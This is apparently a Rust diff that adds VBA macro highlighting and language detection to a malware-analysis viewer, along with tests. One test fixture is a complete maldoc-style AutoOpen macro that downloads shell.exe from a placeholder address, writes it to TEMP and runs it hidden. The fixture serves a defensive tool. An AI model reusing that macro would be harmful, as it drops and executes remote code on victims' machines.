@@ -2,7 +2,7 @@
 //!
 //! A single generic tokenizer (driven by a per-language [`Spec`]) covers the
 //! script / C-like languages malware analysts actually meet — JS, PowerShell,
-//! VBScript, Python, shell, batch, PHP, and friends — plus small dedicated
+//! VBA, VBScript, Python, shell, batch, PHP, and friends — plus small dedicated
 //! tokenizers for JSON, XML/HTML, and Markdown. The language is auto-detected
 //! from the file extension, falling back to a content sniff. Everything is byte
 //! offsets into the text, and every span boundary lands on an ASCII byte (words
@@ -131,17 +131,38 @@ impl Span {
     }
 }
 
+/// How a string literal protects its own delimiter.
+#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
+enum StrEsc {
+    /// `\` escapes the next byte and a string may span lines (C, JS, Python,
+    /// shell, PHP).
+    Backslash,
+    /// `\` is an ordinary byte, the delimiter doubled stands for itself, and a
+    /// string ends at the newline (VB family, batch). Applying the backslash
+    /// rule here is not cosmetic: a Windows path — `"C:\Windows\"` — ends on an
+    /// escaped quote, so the string never closes and the rest of the file is
+    /// swallowed as one literal.
+    Doubled,
+}
+
 /// A language spec for the generic tokenizer: comment/​string/​keyword shapes.
 #[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
 pub struct Spec {
     line_comments: &'static [&'static str],
+    /// Line comments that must stand alone as a word (VB's `Rem`), so that
+    /// `Remark` and `.Rem` stay identifiers.
+    word_comments: &'static [&'static str],
     block: Option<(&'static str, &'static str)>,
     strings: &'static [u8],
+    esc: StrEsc,
     keywords: &'static [&'static str],
-    /// Keyword match ignores case (PowerShell, VBScript, SQL, batch).
+    /// Keyword match ignores case (PowerShell, VB family, SQL, batch).
     ci_keywords: bool,
     /// Sigil that starts a variable token (`$` for PS/shell/PHP/Perl).
     var_sigil: Option<u8>,
+    /// `&H1F` / `&O17` radix literals (VB family), where a bare `&` is instead
+    /// the string-concatenation operator.
+    amp_radix: bool,
 }
 
 // ---- language table ---------------------------------------------------------
@@ -386,6 +407,153 @@ const KW_VBS: &[&str] = &[
     "false",
     "nothing",
 ];
+/// VBA / VB6 — the macro language inside Office documents, and the single most
+/// common first stage in a maldoc. A superset of [`KW_VBS`]: VBScript is
+/// typeless, whereas VBA declares types and imports Win32 (`Declare PtrSafe
+/// Function ... Lib "kernel32"`). The trailing block is deliberate — the runtime
+/// calls that carry the payload are worth catching the analyst's eye.
+const KW_VBA: &[&str] = &[
+    // module preamble & declarations
+    "attribute",
+    "option",
+    "explicit",
+    "compare",
+    "base",
+    "private",
+    "public",
+    "friend",
+    "global",
+    "static",
+    "const",
+    "dim",
+    "redim",
+    "preserve",
+    "erase",
+    "declare",
+    "lib",
+    "alias",
+    "ptrsafe",
+    "type",
+    "enum",
+    "implements",
+    "withevents",
+    "as",
+    "byval",
+    "byref",
+    "optional",
+    "paramarray",
+    "new",
+    "me",
+    // structure & flow
+    "sub",
+    "function",
+    "property",
+    "get",
+    "let",
+    "set",
+    "end",
+    "exit",
+    "call",
+    "if",
+    "then",
+    "else",
+    "elseif",
+    "select",
+    "case",
+    "for",
+    "each",
+    "to",
+    "step",
+    "next",
+    "do",
+    "loop",
+    "while",
+    "wend",
+    "until",
+    "with",
+    "goto",
+    "gosub",
+    "return",
+    "on",
+    "error",
+    "resume",
+    "stop",
+    // (`Rem` is handled as a whole-word line comment, not a keyword)
+    // operators & literals
+    "and",
+    "or",
+    "not",
+    "xor",
+    "eqv",
+    "imp",
+    "mod",
+    "is",
+    "like",
+    "true",
+    "false",
+    "nothing",
+    "empty",
+    "null",
+    // types
+    "boolean",
+    "byte",
+    "integer",
+    "long",
+    "longlong",
+    "longptr",
+    "single",
+    "double",
+    "currency",
+    "decimal",
+    "string",
+    "date",
+    "object",
+    "variant",
+    "any",
+    // the runtime a triage analyst is actually hunting for
+    "createobject",
+    "getobject",
+    "shell",
+    "shellexecute",
+    "environ",
+    "chr",
+    "chrw",
+    "chrb",
+    "asc",
+    "ascw",
+    "strreverse",
+    "mid",
+    "left",
+    "right",
+    "replace",
+    "split",
+    "join",
+    "hex",
+    "oct",
+    "array",
+    "eval",
+    "execute",
+    "executeglobal",
+    "callbyname",
+    "addressof",
+    "kill",
+    "mkdir",
+    "filecopy",
+    "open",
+    "close",
+    "print",
+    "input",
+    "output",
+    "binary",
+    "random",
+    "append",
+    "write",
+    "line",
+    "seek",
+    "msgbox",
+    "inputbox",
+    "doevents",
+];
 const KW_PHP: &[&str] = &[
     "function",
     "return",
@@ -427,39 +595,83 @@ const KW_PHP: &[&str] = &[
     "gzinflate",
 ];
 
-const fn spec(
-    line_comments: &'static [&'static str],
-    block: Option<(&'static str, &'static str)>,
-    strings: &'static [u8],
-    keywords: &'static [&'static str],
-    ci_keywords: bool,
-    var_sigil: Option<u8>,
-) -> Spec {
-    Spec {
-        line_comments,
-        block,
-        strings,
-        keywords,
-        ci_keywords,
-        var_sigil,
-    }
-}
+/// Defaults for the language table; each entry below states only what differs.
+const BASE: Spec = Spec {
+    line_comments: &[],
+    word_comments: &[],
+    block: None,
+    strings: b"\"'",
+    esc: StrEsc::Backslash,
+    keywords: &[],
+    ci_keywords: false,
+    var_sigil: None,
+    amp_radix: false,
+};
 
-const C_LIKE: Spec = spec(&["//"], Some(("/*", "*/")), b"\"'", KW_C, false, None);
-const JS: Spec = spec(&["//"], Some(("/*", "*/")), b"\"'`", KW_JS, false, None);
-const PY: Spec = spec(&["#"], None, b"\"'", KW_PY, false, None);
-const PS: Spec = spec(&["#"], Some(("<#", "#>")), b"\"'", KW_PS, true, Some(b'$'));
-const SH: Spec = spec(&["#"], None, b"\"'", KW_SH, false, Some(b'$'));
-const BAT: Spec = spec(&["::"], None, b"\"", KW_BAT, true, Some(b'%'));
-const VBS: Spec = spec(&["'"], None, b"\"", KW_VBS, true, None);
-const PHP: Spec = spec(
-    &["//", "#"],
-    Some(("/*", "*/")),
-    b"\"'",
-    KW_PHP,
-    false,
-    Some(b'$'),
-);
+const C_LIKE: Spec = Spec {
+    line_comments: &["//"],
+    block: Some(("/*", "*/")),
+    keywords: KW_C,
+    ..BASE
+};
+const JS: Spec = Spec {
+    line_comments: &["//"],
+    block: Some(("/*", "*/")),
+    strings: b"\"'`",
+    keywords: KW_JS,
+    ..BASE
+};
+const PY: Spec = Spec {
+    line_comments: &["#"],
+    keywords: KW_PY,
+    ..BASE
+};
+const PS: Spec = Spec {
+    line_comments: &["#"],
+    block: Some(("<#", "#>")),
+    keywords: KW_PS,
+    ci_keywords: true,
+    var_sigil: Some(b'$'),
+    ..BASE
+};
+const SH: Spec = Spec {
+    line_comments: &["#"],
+    keywords: KW_SH,
+    var_sigil: Some(b'$'),
+    ..BASE
+};
+// Batch takes `Doubled` for the escape rule only to get the `\` half of it:
+// `copy x "C:\Temp\"` must not swallow the file.
+const BAT: Spec = Spec {
+    line_comments: &["::"],
+    strings: b"\"",
+    esc: StrEsc::Doubled,
+    keywords: KW_BAT,
+    ci_keywords: true,
+    var_sigil: Some(b'%'),
+    ..BASE
+};
+const VBS: Spec = Spec {
+    line_comments: &["'"],
+    word_comments: &["rem"],
+    strings: b"\"",
+    esc: StrEsc::Doubled,
+    keywords: KW_VBS,
+    ci_keywords: true,
+    amp_radix: true,
+    ..BASE
+};
+const VBA: Spec = Spec {
+    keywords: KW_VBA,
+    ..VBS
+};
+const PHP: Spec = Spec {
+    line_comments: &["//", "#"],
+    block: Some(("/*", "*/")),
+    keywords: KW_PHP,
+    var_sigil: Some(b'$'),
+    ..BASE
+};
 
 /// Detect the language from the file name, falling back to a content sniff.
 pub fn detect(file_name: &str, text: &str) -> Lang {
@@ -477,7 +689,10 @@ pub fn detect(file_name: &str, text: &str) -> Lang {
         "ps1" | "psm1" | "psd1" => return Lang::Generic(PS),
         "sh" | "bash" | "zsh" | "ksh" => return Lang::Generic(SH),
         "bat" | "cmd" => return Lang::Generic(BAT),
-        "vbs" | "vbe" | "wsf" | "vb" => return Lang::Generic(VBS),
+        "vbs" | "vbe" | "wsf" => return Lang::Generic(VBS),
+        // Office macro modules as olevba / oledump extract them, plus VB6 forms
+        // and classes and VB.NET — all typed VB rather than VBScript.
+        "bas" | "cls" | "frm" | "vba" | "vb" => return Lang::Generic(VBA),
         "php" | "php5" | "phtml" | "pl" | "pm" | "rb" => return Lang::Generic(PHP),
         "json" => return Lang::Json,
         "xml" | "html" | "htm" | "xhtml" | "svg" | "xaml" | "plist" | "hta" | "config" => {
@@ -530,6 +745,11 @@ fn sniff(text: &str) -> Lang {
     if head.starts_with('{') || head.starts_with('[') {
         return Lang::Json;
     }
+    // Before the JavaScript heuristic below, which would otherwise claim a
+    // `Public Function ...` module for JS.
+    if looks_like_vba(head) {
+        return Lang::Generic(VBA);
+    }
     if lower_first.contains("function ") || head.contains("=>") || head.contains("var ") {
         return Lang::Generic(JS);
     }
@@ -537,6 +757,42 @@ fn sniff(text: &str) -> Lang {
         return Lang::Markdown;
     }
     Lang::Plain
+}
+
+/// VBA / VB6 source with no usable extension — a macro body pasted into a `.txt`
+/// or carved out of an OLE stream. Keyed on markers with no JavaScript or C
+/// reading at all: the `Attribute VB_Name` header every extracted Office module
+/// carries, the module preamble, the block terminators (a brace language has
+/// none), and scope-prefixed declarations. A bare `Sub foo` / `function foo` is
+/// deliberately *not* enough — `sub = re.sub(x)` is Python, and `function f()`
+/// is JavaScript.
+fn looks_like_vba(head: &str) -> bool {
+    const DEFINITE: &[&str] = &[
+        "attribute vb_",
+        "option explicit",
+        "option compare",
+        "end sub",
+        "end function",
+        "end property",
+    ];
+    const SCOPES: &[&str] = &["private ", "public ", "friend ", "static "];
+    const DECLS: &[&str] = &[
+        "sub ",
+        "function ",
+        "property ",
+        "declare ",
+        "const ",
+        "type ",
+    ];
+
+    head.lines().take(40).any(|line| {
+        let low = line.trim_start().to_ascii_lowercase();
+        DEFINITE.iter().any(|m| low.starts_with(m))
+            || SCOPES
+                .iter()
+                .filter_map(|p| low.strip_prefix(p))
+                .any(|rest| DECLS.iter().any(|d| rest.starts_with(d)))
+    })
 }
 
 /// The languages offered in the manual override picker, with display names.
@@ -548,7 +804,8 @@ pub fn selectable() -> &'static [(&'static str, Lang)] {
         ("PowerShell", Lang::Generic(PS)),
         ("Shell / Bash", Lang::Generic(SH)),
         ("Batch / CMD", Lang::Generic(BAT)),
-        ("VBScript / VBA", Lang::Generic(VBS)),
+        ("VBA / VB6 macro", Lang::Generic(VBA)),
+        ("VBScript", Lang::Generic(VBS)),
         ("PHP / Perl", Lang::Generic(PHP)),
         ("JSON", Lang::Json),
         ("XML / HTML", Lang::Xml),
@@ -688,14 +945,41 @@ fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
         if lc {
             continue;
         }
+        // whole-word line comments (VB's `Rem`). Requires a boundary on both
+        // sides so `Remark` stays an identifier, and rejects a leading `.` so
+        // the member `.Rem` does not comment out the rest of the line.
+        if !spec.word_comments.is_empty()
+            && (i == 0 || (!is_word(src[i - 1]) && src[i - 1] != b'.'))
+            && spec
+                .word_comments
+                .iter()
+                .any(|w| word_at(src, i, w, spec.ci_keywords))
+        {
+            let start = i;
+            while i < n && src[i] != b'\n' {
+                i += 1;
+            }
+            out.push(Span::new(start, i, Tok::Comment));
+            continue;
+        }
         // strings
         if spec.strings.contains(&b) {
             let start = i;
             i += 1;
             while i < n {
-                if src[i] == b'\\' && i + 1 < n {
-                    i += 2;
-                    continue;
+                match spec.esc {
+                    StrEsc::Backslash if src[i] == b'\\' && i + 1 < n => {
+                        i += 2;
+                        continue;
+                    }
+                    // A VB string ends at the newline, so one stray quote
+                    // cannot colour the remainder of the file.
+                    StrEsc::Doubled if src[i] == b'\n' => break,
+                    StrEsc::Doubled if src[i] == b && i + 1 < n && src[i + 1] == b => {
+                        i += 2;
+                        continue;
+                    }
+                    _ => {}
                 }
                 if src[i] == b {
                     i += 1;
@@ -705,6 +989,30 @@ fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
             }
             out.push(Span::new(start, i, Tok::Str));
             continue;
+        }
+        // VB radix literal: `&H1F`, `&O17`, with an optional `&` type suffix. A
+        // bare `&` is concatenation, so this must not misread `a &Hex(1)` —
+        // hence the requirement that the digits stop on a non-word byte.
+        if spec.amp_radix && b == b'&' && i + 2 < n {
+            let radix: Option<u32> = match src[i + 1] | 0x20 {
+                b'h' => Some(16),
+                b'o' => Some(8),
+                _ => None,
+            };
+            if let Some(radix) = radix {
+                let mut j = i + 2;
+                while j < n && (src[j] as char).is_digit(radix) {
+                    j += 1;
+                }
+                if j > i + 2 && (j >= n || !is_word(src[j])) {
+                    if j < n && src[j] == b'&' {
+                        j += 1;
+                    }
+                    out.push(Span::new(i, j, Tok::Number));
+                    i = j;
+                    continue;
+                }
+            }
         }
         // variable sigil ($x, %x%)
         if spec.var_sigil == Some(b) {
@@ -733,8 +1041,12 @@ fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
             while i < n && is_word(src[i]) {
                 i += 1;
             }
-            let word = &src[start..i];
-            if is_keyword(word, spec) {
+            // `o2.Type` is a member, never the `Type` keyword. Colouring members
+            // as properties both avoids that misreading and makes the
+            // object-model calls that do the work in a maldoc — `.SaveToFile`,
+            // `.responseBody` — stand out from the language itself.
+            let member = start > 0 && src[start - 1] == b'.';
+            if !member && is_keyword(&src[start..i], spec) {
                 out.push(Span::new(start, i, Tok::Keyword));
             } else {
                 // a following '(' makes it a call
@@ -744,12 +1056,34 @@ fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
                 }
                 if j < n && src[j] == b'(' {
                     out.push(Span::new(start, i, Tok::Func));
+                } else if member {
+                    out.push(Span::new(start, i, Tok::Prop));
                 }
             }
             continue;
         }
         i += 1;
     }
+}
+
+/// Whether `word` sits at `src[at..]` as a complete word (boundary after it).
+///
+/// The empty-word rejection is load-bearing: an empty marker would match here
+/// vacuously, and its caller would then emit a zero-width comment span without
+/// advancing the cursor — spinning forever on the next newline.
+fn word_at(src: &[u8], at: usize, word: &str, ci: bool) -> bool {
+    let end = at + word.len();
+    if word.is_empty() || end > src.len() {
+        return false;
+    }
+    let hit = if ci {
+        word.bytes()
+            .zip(&src[at..end])
+            .all(|(a, b)| a.eq_ignore_ascii_case(b))
+    } else {
+        word.as_bytes() == &src[at..end]
+    };
+    hit && (end == src.len() || !is_word(src[end]))
 }
 
 fn is_keyword(word: &[u8], spec: &Spec) -> bool {
@@ -1247,6 +1581,167 @@ mod tests {
         assert_eq!(tok_of(src, l, "Function"), Some(Tok::Keyword));
     }
 
+    /// A maldoc macro in the shape olevba extracts them: module header, an
+    /// auto-exec entry point, `Chr()` string building, and the ADODB/MSXML
+    /// download-and-run pair. Address is RFC 5737 documentation space.
+    const VBA_SAMPLE: &str = r#"Attribute VB_Name = "NewMacros"
+Sub AutoOpen()
+    Dim v1 As String, v2 As String
+    v1 = Chr(104) & Chr(116) & "://192.0.2.1:8989/shell.exe"
+    v2 = Environ("TEMP") & "\update.exe"
+
+    Dim o1 As Object
+    Set o1 = CreateObject("MSXML2.XMLHTTP")
+    o1.Open "GET", v1, False
+    o1.Send
+
+    If o1.Status = 200 Then
+        Dim o2 As Object
+        Set o2 = CreateObject("ADODB.Stream")
+        o2.Type = 1
+        o2.Write o1.responseBody
+        o2.SaveToFile v2, 2
+        o2.Close
+
+        Shell v2, vbHide
+    End If
+End Sub"#;
+
+    #[test]
+    fn vba_detection() {
+        // Office macro modules, VB6 classes/forms, VB.NET.
+        for f in ["m.bas", "M.CLS", "form1.frm", "x.vba", "a.vb"] {
+            assert_eq!(detect(f, ""), Lang::Generic(VBA), "{f}");
+        }
+        // VBScript keeps its own spec.
+        assert_eq!(detect("a.vbs", ""), Lang::Generic(VBS));
+        // Extensionless / renamed macro bodies fall to the content sniff.
+        assert_eq!(detect("dump", VBA_SAMPLE), Lang::Generic(VBA));
+        assert_eq!(
+            detect("x.txt", "Option Explicit\r\nDim a\r\n"),
+            Lang::Generic(VBA)
+        );
+        assert_eq!(
+            detect(
+                "x",
+                "Public Function Decode(s As String) As String\nEnd Function"
+            ),
+            Lang::Generic(VBA)
+        );
+    }
+
+    #[test]
+    fn vba_sniff_does_not_steal_other_languages() {
+        // `looks_like_vba` runs ahead of the JS heuristic, so it must not claim
+        // a brace language or a Python module that merely says "sub".
+        assert_eq!(detect("x", "function f() { return 1; }"), Lang::Generic(JS));
+        assert_eq!(
+            detect("x", "#!/usr/bin/env python3\nsub = re.sub(p, r, s)\n"),
+            Lang::Generic(PY)
+        );
+        assert_eq!(detect("x", "var x = 1;\n"), Lang::Generic(JS));
+        assert!(!looks_like_vba("let subtotal = 1;\nproperty = 2;\n"));
+    }
+
+    #[test]
+    fn vba_tokens() {
+        let l = Lang::Generic(VBA);
+        let s = VBA_SAMPLE;
+        assert_eq!(tok_of(s, l, "Attribute"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "\"NewMacros\""), Some(Tok::Str));
+        assert_eq!(tok_of(s, l, "Sub"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "AutoOpen"), Some(Tok::Func)); // auto-exec trigger
+        assert_eq!(tok_of(s, l, "As String"), Some(Tok::Keyword)); // typed decl
+        assert_eq!(tok_of(s, l, "Chr"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "104"), Some(Tok::Number));
+        assert_eq!(tok_of(s, l, "CreateObject"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "Environ"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "Shell"), Some(Tok::Keyword));
+        assert_clean(s, l);
+    }
+
+    #[test]
+    fn vba_member_access_is_not_a_keyword() {
+        // `Type`, `Open`, `Write` and `Close` are all VBA reserved words, but
+        // after a `.` they are members of the ADODB.Stream object.
+        let l = Lang::Generic(VBA);
+        for m in [
+            "Type",
+            "Write",
+            "SaveToFile",
+            "Close",
+            "responseBody",
+            "Status",
+        ] {
+            let src = format!("o2.{m}");
+            assert_eq!(tok_of(&src, l, m), Some(Tok::Prop), "{m}");
+        }
+        // Bare, the same words are keywords again.
+        assert_eq!(tok_of("Type T\n", l, "Type"), Some(Tok::Keyword));
+        // A member call still reads as a call.
+        assert_eq!(tok_of("sh.Run(cmd)", l, "Run"), Some(Tok::Func));
+    }
+
+    #[test]
+    fn vb_strings_do_not_treat_backslash_as_an_escape() {
+        // The bug this guards: with C escaping, the `\"` ending a Windows path
+        // swallows the rest of the file into one string literal.
+        let l = Lang::Generic(VBA);
+        let src = "a = \"C:\\Windows\\\"\nShell b\n";
+        assert_eq!(tok_of(src, l, "\"C:"), Some(Tok::Str));
+        assert_eq!(tok_of(src, l, "Shell"), Some(Tok::Keyword));
+        assert_clean(src, l);
+        // Batch has the same path problem and the same fix.
+        let bat = "copy x \"C:\\Temp\\\"\necho done\n";
+        assert_eq!(tok_of(bat, Lang::Generic(BAT), "echo"), Some(Tok::Keyword));
+    }
+
+    #[test]
+    fn vb_strings_double_the_quote_and_end_at_the_line() {
+        let l = Lang::Generic(VBA);
+        // `""` is an embedded quote, so the literal runs to the final quote.
+        let src = "a = \"say \"\"hi\"\"\" & x";
+        assert_eq!(tok_of(src, l, "\"say"), Some(Tok::Str));
+        assert_eq!(spans(src, l)[0].1, src.find(" & x").unwrap());
+        // An unterminated quote stops at the newline, not at EOF.
+        let un = "a = \"oops\nDim b\n";
+        assert_eq!(tok_of(un, l, "Dim"), Some(Tok::Keyword));
+        assert_clean(un, l);
+    }
+
+    #[test]
+    fn vb_radix_literals() {
+        let l = Lang::Generic(VBA);
+        assert_eq!(tok_of("x = &H41", l, "&H41"), Some(Tok::Number));
+        assert_eq!(tok_of("x = &hff&", l, "&hff&"), Some(Tok::Number));
+        assert_eq!(tok_of("x = &O17", l, "&O17"), Some(Tok::Number));
+        // A bare `&` is concatenation: `&Hex(` must not be read as `&He` + `x`,
+        // and `&O` with no octal digit is not a literal either.
+        // Both stay whole keywords, so neither `&He` nor `&O` was eaten first.
+        assert_eq!(tok_of("s = a &Hex(1)", l, "Hex"), Some(Tok::Keyword));
+        assert_eq!(tok_of("s = a &Oct(1)", l, "Oct"), Some(Tok::Keyword));
+        assert_eq!(tok_of("s = a & b", l, "&"), None);
+        for src in ["&H", "&", "&H&", "&HG", "&O9", "x = &"] {
+            assert_clean(src, l);
+        }
+    }
+
+    #[test]
+    fn vb_rem_comments() {
+        let l = Lang::Generic(VBA);
+        assert_eq!(
+            tok_of("Rem stager\nDim a", l, "Rem stager"),
+            Some(Tok::Comment)
+        );
+        assert_eq!(tok_of("REM x\n", l, "REM x"), Some(Tok::Comment));
+        assert_eq!(tok_of("Dim a\n", l, "Dim"), Some(Tok::Keyword));
+        // Word boundary: neither an identifier nor a member starts a comment.
+        assert_eq!(tok_of("Remark = 1\n", l, "Remark"), None);
+        assert_eq!(tok_of("o.Rem = 1\n", l, "Rem"), Some(Tok::Prop));
+        // The apostrophe form still works.
+        assert_eq!(tok_of("' note\n", l, "' note"), Some(Tok::Comment));
+    }
+
     #[test]
     fn json_tokens() {
         let src = "{ \"key\": \"val\", \"n\": 42, \"ok\": true, \"x\": null }";
@@ -1321,10 +1816,17 @@ mod tests {
             "[link](no close",
             "",
             "   ",
+            "\"unterminated VB string",
+            "Rem",
+            "&H",
+            ".",
+            "\"\"\"",
         ];
         let langs = [
             Lang::Generic(JS),
             Lang::Generic(VBS),
+            Lang::Generic(VBA),
+            Lang::Generic(BAT),
             Lang::Json,
             Lang::Xml,
             Lang::Markdown,
@@ -1347,6 +1849,53 @@ mod tests {
             assert!(!near(c.keyword, c.string), "keyword ≈ string on {t:?}");
             assert!(!near(c.keyword, c.number), "keyword ≈ number on {t:?}");
             assert!(!near(c.func, c.keyword), "func ≈ keyword on {t:?}");
+        }
+    }
+
+    #[test]
+    fn fuzz_all_tokenizers_terminate_and_stay_clean() {
+        // Deterministic xorshift over a hostile alphabet: every construct the
+        // tokenizers special-case, jammed together in random order. This guards
+        // the "cursor always advances" invariant — a stall is not a wrong colour
+        // but a hung UI thread on a file an analyst was handed — alongside span
+        // ordering and UTF-8 boundaries. A regression here hangs this test.
+        const ALPHABET: &[&str] = &[
+            "\"", "'", "\\", "\n", "\r", "&H", "&O", "&", "Rem", "rem", ".", "..", "{", "}", "/*",
+            "*/", "//", "::", "<#", "#>", "<!--", "-->", "#", "$", "%", "`", "[", "]", "(", ")",
+            "0x1", "9", "é", "日", "_", "<a", "/>", ">", "*", "|", "?", "-", ":", "=", "\"\"", " ",
+            "Sub", "End", "a",
+        ];
+        let langs = [
+            Lang::Plain,
+            Lang::Generic(C_LIKE),
+            Lang::Generic(JS),
+            Lang::Generic(PY),
+            Lang::Generic(PS),
+            Lang::Generic(SH),
+            Lang::Generic(BAT),
+            Lang::Generic(VBS),
+            Lang::Generic(VBA),
+            Lang::Generic(PHP),
+            Lang::Json,
+            Lang::Xml,
+            Lang::Markdown,
+            Lang::Yara,
+        ];
+        let mut state = 0x9e37_79b9u32;
+        let mut rnd = move || {
+            state ^= state << 13;
+            state ^= state >> 17;
+            state ^= state << 5;
+            state
+        };
+        for _ in 0..2000 {
+            let mut src = String::new();
+            for _ in 0..(rnd() % 24) {
+                src.push_str(ALPHABET[rnd() as usize % ALPHABET.len()]);
+            }
+            for l in langs {
+                assert_clean(&src, l);
+            }
         }
     }
 
